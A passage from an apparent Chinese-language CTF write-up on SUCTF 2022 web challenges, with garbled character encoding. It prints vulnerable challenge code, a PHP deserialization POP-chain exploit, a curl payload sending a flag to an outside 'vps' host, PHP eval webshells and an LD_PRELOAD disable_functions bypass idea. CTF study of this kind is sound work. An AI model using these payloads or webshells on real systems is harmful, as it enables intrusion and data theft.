class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1 . <span class="string">&#x27;114514&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;f1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1-&gt;get_flag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a-&gt;run();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;m1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span> . <span class="keyword">$this</span>-&gt;m1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    unserialize(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>popé“¾ï¼š</p>
<blockquote>
<p>1.é¦–å…ˆæ‰¾åˆ°<code>destruct</code>æ–¹æ³•ä½œä¸ºå…¥å£ï¼Œè§¦å‘toString</p>
<p>2.whatç±»é‡Œé¢è½¬åˆ°mixç±»çš„runæ–¹æ³•</p>
<p>3.mixçš„runè§¦å‘crowçš„invokeæ–¹æ³•</p>
<p>4.ç„¶åè§¦å‘callæ–¹æ³•è°ƒç”¨get_flag</p>
<p>5.æœ€åæ¢è¡Œç»•è¿‡æ³¨é‡Š</p>
</blockquote>
<p>poc:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$v1</span>,<span class="variable">$v2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;v1 = <span class="variable">$v1</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;v2 = <span class="variable">$v2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;f1 = <span class="variable">$f1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$m1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;m1 = <span class="variable">$m1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> fin(<span class="keyword">new</span> what(<span class="keyword">new</span> mix(<span class="keyword">new</span> crow(<span class="keyword">new</span> fin(<span class="keyword">new</span> mix(<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">system(\&#x27;grep -r &quot;&#123;&quot;\&#x27;);&#x27;</span>)),<span class="string">&#x27;&#x27;</span>))));</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/dd21e53e9fd84bd6a15edb95d6ea3c40.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<blockquote>
<p>å¤ç°æ¥å•¦ ~</p>
</blockquote>
<h4 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, url_for, render_template_string, redirect, request, current_app, session, \</span><br><span class="line">    abort, send_from_directory</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">s</span>):</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;class&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;args&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;from_pyfile&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;local&#x27;</span>, <span class="string">&#x27;self&#x27;</span>, <span class="string">&#x27;item&#x27;</span>, <span class="string">&#x27;getitem&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;getattribute&#x27;</span>, <span class="string">&#x27;func_globals&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;join&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>]</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> s.lower():</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(no)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="string">&quot;æ¬¢è¿æ¥åˆ°SUctf2022&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span>():</span></span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    num = request.values.get(<span class="string">&quot;num&quot;</span>)</span><br><span class="line">    log = <span class="string">&quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>, time.localtime()), ip, num)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> waf(num):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="built_in">eval</span>(num)</span><br><span class="line">            os.system(log)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;waf!!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p><strong>1.èµ›æ—¶</strong></p>
<p>wafè¿‡æ»¤äº†å¾ˆå¤šå…³é”®è¯å’Œç¬¦å·ï¼Œæ‰€ä»¥å‡ ä¹ä¸èƒ½ç”¨SSTIæ³¨å…¥ï¼Œ<del>ä½†æ˜¯å½“æ—¶å°±æƒ³ç€è‚¯å®šèƒ½ç”¨SSTI</del>ï¼Œæ‰€ä»¥å°±ä¸€ç›´å¡ä½äº†ï¼ˆ</p>
<p>ç„¶åå› ä¸ºä¹‹å‰åšè¿‡ç±»ä¼¼çš„ï¼Œåˆ©ç”¨æŠ¥é”™è¿›è¡Œæ¨¡æ¿æ³¨å…¥ï¼Œä½†æ˜¯è¿™é“é¢˜åˆ©ç”¨<code>1/0#</code>è¿™ç§å½¢å¼ä¹Ÿæ˜¯å®Œå…¨è¿‡ä¸äº†çš„ï¼Œå› ä¸ºæœ‰jsè¿›è¡Œæ£€æµ‹</p>
<p>ç„¶åå°±æŠŠç›®å…‰æ”¾åˆ°äº†evalä¸­ï¼Œåœ¨æƒ³ç€è¯¥æ€ä¹ˆä¼ å…¥numæ‰ä½¿å¾—evalæˆ–è€…systemæ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„ä»£ç ï¼Œä½†æ˜¯ä¸€ç›´æ²¡æœ‰æƒ³åˆ°è¯¥æ€ä¹ˆåŠ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span>():</span></span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    num = request.values.get(<span class="string">&quot;num&quot;</span>)</span><br><span class="line">    log = <span class="string">&quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>, time.localtime()), ip, num)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> waf(num):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="built_in">eval</span>(num)</span><br><span class="line">            os.system(log)</span><br></pre></td></tr></table></figure>

<p><strong>2.èµ›å</strong></p>
<p>èµ›åçœ‹äº†<a href="https://blog.csdn.net/weixin_51458899/article/details/123782291?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-1.pc_relevant_paycolumn_v3&spm=1001.2101.3001.4242.2&utm_relevant_index=4">åˆ«çš„å¸ˆå‚…</a>çš„wp</p>
<p>ç¡®å®æ˜¯ä»<code>os.system(log)</code>å…¥æ‰‹çš„ï¼Œä½†æ˜¯è¿™é‡Œç”¨åˆ°<code>#</code>æ˜¯ä¸ºäº†æ³¨é‡Šæ‰åé¢çš„å†…å®¹ï¼Œå› ä¸ºå¦‚æœ<code>eval(num)</code>å‡ºé”™çš„è¯ï¼Œæ˜¯ä¸ä¼šè¿›è¡Œä¸‹å»çš„ï¼Œå¯¼è‡´å®ç°ä¸äº†rce</p>
<p><img src="https://img-blog.csdnimg.cn/a225b8cc4c674fe0809fe6974957923f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>è€Œpythonåˆæ”¯æŒ<code>#</code>ä¸å­—ç¬¦è¿æ¥è¿˜æ˜¯èƒ½å½“ä½œæ³¨é‡Šç¬¦ï¼Œè€Œåœ¨unixä¸­å¦‚æœ<code>#</code>ä¸å­—ç¬¦ç›¸é‚»åˆ™ä¹Ÿä¼šè¢«å½“ä½œå­—ç¬¦ï¼Œå°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªåŒºåˆ«ç›´æ¥æ„é€ payload</p>
<p>å†åˆ©ç”¨åå¼•å·è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p>
<p><img src="https://img-blog.csdnimg.cn/eeab61a3bc544fbe875c608f7ea37202.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>ä¸è¿‡æ„Ÿè§‰å¯èƒ½æ˜¯ç¯å¢ƒåŸå› ï¼Œç›´æ¥ç”¨åå¼•å·æ²¡æœ‰è¿”å›å€¼ï¼Œç›´æ¥ç”¨curlå¤–å¸¦ï¼Œpayloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/calc?num=1%23`curl%09http://vps:5656/?flag=\`cat%09Th1s*\``</span><br></pre></td></tr></table></figure>

<h4 id="upgdstore"><a href="#upgdstore" class="headerlink" title="upgdstore"></a>upgdstore</h4><ul>
<li>SplFileObject</li>
<li>åˆ©ç”¨ç¯å¢ƒå˜é‡getshell putenv</li>
<li>pythonæ­å»ºftpæœåŠ¡</li>
<li>suidææƒ</li>
</ul>
<p><strong>1.èµ›æ—¶</strong></p>
<p>ä¸€çœ‹æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œè¿˜åªèƒ½ä¸Šä¼ phpæ–‡ä»¶ï¼Œé‚£å°±ç›´æ¥çœ‹<code>phpinfo()</code>ï¼Œç„¶åå°±å¯ä»¥å‘ç°å¾ˆå¤šå¸¸ç”¨çš„å‡½æ•°è¢«ç¦æ‰äº†ï¼Œç„¶ååæ¥çªç„¶æƒ³åˆ°ç”¨FFIï¼Œä½†æ˜¯ä¸€çœ‹ï¼Œä¹Ÿè¢«ç¦æ‰äº†</p>
<p><img src="https://img-blog.csdnimg.cn/096fe2b528874e2db312bd5aed3e89b7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>å†åæ¥å°è¯•ç”¨åŸç”Ÿç±»ï¼Œæˆ‘ä»¬åœ¨æµ‹è¯•ä¸­å¯ä»¥å‘ç°<code>=|$|-|^</code>ç­‰å­—ç¬¦ä¹Ÿä¸å¯ç”¨ï¼Œ é‚£ä¹Ÿå‡ ä¹ä¸å¯ä»¥ç”¨åŸç”Ÿç±»ï¼Œå› ä¸ºæ—¢ç„¶ä¸èƒ½ç”¨<code>$</code>æ¥èµ‹å€¼ï¼Œé‚£ä¹ˆåªèƒ½ç›´æ¥newä¸€ä¸ªç±»æ¥ç”¨<code>-&gt;</code>æ¥è°ƒç”¨æ–¹æ³•ï¼Œä½†æ˜¯æ˜¾è€Œæ˜“è§ä¸å¯ä»¥ï¼Œä¹‹åå°±ç›´æ¥æ‘†äº†ï¼ˆğŸ¥º</p>
<p><strong>2.èµ›å</strong></p>
<p>â‘  show_sourceæ²¡æœ‰è¢«banï¼Œä½†æ˜¯ä¼šè¢«è¿‡æ»¤ï¼Œå¯ä»¥åˆ©ç”¨phpå¤§å°å†™ä¸æ•æ„Ÿç»•è¿‡ï¼Œè·å–<code>index.php</code>çš„æºç ï¼Œä¸ä»…è¿‡æ»¤äº†å‡½æ•°è¿˜è¿‡æ»¤äº†ç‰¹æ®Šå­—ç¬¦</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;eval&quot;</span>,<span class="string">&quot;copy&quot;</span> ,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;usort&quot;</span>,<span class="string">&quot;include&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>,<span class="string">&quot;file&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwriter&quot;</span>,<span class="string">&quot;fput&quot;</span>,<span class="string">&quot;copy&quot;</span>,<span class="string">&quot;curl&quot;</span>,<span class="string">&quot;fread&quot;</span>,<span class="string">&quot;fget&quot;</span>,<span class="string">&quot;function_exists&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;putenv&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;proc_close&quot;</span>, <span class="string">&quot;proc_get_status&quot;</span>,<span class="string">&quot;checkdnsrr&quot;</span>,<span class="string">&quot;getmxrr&quot;</span>,<span class="string">&quot;getservbyname&quot;</span>,<span class="string">&quot;getservbyport&quot;</span>, <span class="string">&quot;syslog&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;highlight_file&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;chmod&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackword</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strstr(<span class="variable">$var</span>, <span class="variable">$blackword</span>)) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//è®¾ç½®ä¸Šä¼ ç›®å½•</span></span><br><span class="line">define(<span class="string">&quot;UPLOAD_PATH&quot;</span>, <span class="string">&quot;./uploads&quot;</span>);</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&quot;Upload Success!&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$ext</span> = pathinfo(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/php/i&quot;</span>, strtolower(<span class="variable">$ext</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;åªè¦å¥½çœ‹çš„php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = file_get_contents(<span class="variable">$temp_file</span>);</span><br><span class="line"><span class="keyword">if</span>(fun(<span class="variable">$content</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;è¯¶ï¼Œè¢«æˆ‘å‘ç°äº†å§&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$new_file_name</span> = md5(<span class="variable">$file_name</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$new_file_name</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;Upload Failed!&#x27;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div style=&quot;color:#F00&quot;&gt;&#x27;</span>.<span class="variable">$msg</span>.<span class="string">&quot; Look here~ &quot;</span>.<span class="variable">$img_path</span>.<span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>â‘¡ ä¸Šä¼ æ–‡ä»¶</p>
<h6 id="ä¸€äº›æœ‰ç”¨çš„çŸ¥è¯†"><a href="#ä¸€äº›æœ‰ç”¨çš„çŸ¥è¯†" class="headerlink" title="ä¸€äº›æœ‰ç”¨çš„çŸ¥è¯†"></a>ä¸€äº›æœ‰ç”¨çš„çŸ¥è¯†</h6><p>â€‹    â… .å¯ä»¥åˆ©ç”¨base64+phpä¼ªåè®®åŒ…å«æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//yuer.php</span></span><br><span class="line">PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+ <span class="comment">// <span class="meta">&lt;?php</span> eval($_POST[1]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="comment">// yuer1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">Include</span>(base64_decode(<span class="string">&quot;cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPTJjYzAxMzkzMmVhZjJmY2IzODNmZGE3MzVmZWYwYTM2LnBocA==&quot;</span>)); <span class="comment">// php://filter/read=convert.base64-decode=xxx.php</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/dc1f4ea68a4141578c4dca57a89f3512.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>â€‹        â…¡. å­—ç¬¦ä¸²æ‹¼æ¥åŠ¨æ€å‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> (<span class="string">&quot;fil&quot;</span>.<span class="string">&quot;e_get_contents&quot;</span>)(<span class="string">&quot;/var/www/html/index.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>â€‹        â…¢. åŸç”Ÿç±»<strong>SplFileObject::fwrite</strong>å†™å…¥æ–‡ä»¶</p>
<p>å­¦åˆ°äº†æ–°è¯­æ³•ï¼ï¼å¥½è€¶ï¼</p>
<p>é‡å†™ä¸€ä¸ªç±»æ˜¯ä¸ºäº†å®ç°æŠŠåŠ¨æ€æ–¹æ³•å®ç°é™æ€è°ƒç”¨ï¼Œå› ä¸ºåŠ¨æ€è°ƒç”¨çš„<code>-</code>è¢«banäº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">define(<span class="string">&quot;F&quot;</span>, <span class="string">&quot;fil&quot;</span>.<span class="string">&quot;e_get_contents&quot;</span>); </span><br><span class="line">define(<span class="string">&quot;VALUE&quot;</span>,(F)(<span class="string">&quot;/var/www/html/index.php&quot;</span>)[<span class="number">353</span>]);</span><br><span class="line">define(<span class="string">&quot;E&quot;</span>, <span class="string">&quot;e&quot;</span>.<span class="string">&quot;val&quot;</span>);</span><br><span class="line">define(<span class="string">&quot;SHELL&quot;</span>,<span class="string">&quot;&lt;?php &quot;</span>.E.<span class="string">&quot;(&quot;</span>.VALUE.<span class="string">&quot;_POST[&#x27;a&#x27;]);?&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> (F)(<span class="string">&quot;./shell.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Splf</span> <span class="keyword">extends</span> <span class="title">SplFileObject</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="built_in">parent</span>::fwrite(SHELL);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define(<span class="string">&quot;AMEUU&quot;</span>,<span class="keyword">new</span> Splf(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;w&quot;</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>â‘¢ bypass disable_functions</p>
<p>ç”±äº<code>putenv</code>æ²¡æœ‰è¢«banï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹<code>LD_PRELOAD</code>ç¯å¢ƒå˜é‡çš„å€¼ï¼Œå¯ä»¥æ‰§è¡Œæˆ‘ä»¬ä¸Šä¼ çš„æ¶æ„osæ–‡ä»¶</p>
<p>expï¼š</p>
<p>å› ä¸ºputenvå’Œmailéƒ½æ²¡æœ‰è¢«banï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨mailè§¦å‘getuidåå¼¹shell</p>
